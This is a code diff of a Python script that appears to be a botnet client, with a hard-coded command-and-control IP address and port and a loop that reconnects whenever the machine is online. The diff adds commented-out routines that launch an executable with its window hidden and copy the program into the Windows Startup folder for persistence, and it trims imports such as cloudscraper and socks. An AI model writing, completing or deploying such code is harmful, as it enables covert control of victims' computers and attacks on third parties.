@@ -1,11 +1,7 @@
-import socket, threading, time, random, cloudscraper, requests
+import socket, threading, time, random, requests
 import os
-import shutil
-import sys
-import subprocess
-from requests.exceptions import SSLError, Timeout
-import socks
-import sys
+
+
 
 C2_ADDRESS  = "87.106.232.239"
 C2_PORT     = 5555
@@ -214,7 +210,21 @@ def main():
 
         main()
 
+#def get_executable_path():
+   # return os.path.abspath(sys.argv[0])
 
+#def hide_cmd_and_run_exe(exe_path):
+  #  startupinfo = subprocess.STARTUPINFO()
+  #  startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+  #  subprocess.Popen(exe_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
+
+#def copy_self_to_startup():
+   # script_or_exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+   # script_or_exe_dir = os.path.dirname(os.path.abspath(script_or_exe_path))
+   # script_or_exe_name = os.path.basename(script_or_exe_path)
+   # startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+   # if not script_in_startup:
+       # shutil.copy(os.path.join(script_or_exe_dir, script_or_exe_name), os.path.join(startup_folder, script_or_exe_name))
 
 def check_internet_connection():
     try:
@@ -226,6 +236,8 @@ def check_internet_connection():
 if __name__ == '__main__':
     while True:
         if check_internet_connection():
+            #copy_self_to_startup()
+            #exe_path = get_executable_path()
             main()
         else:
             time.sleep(5)
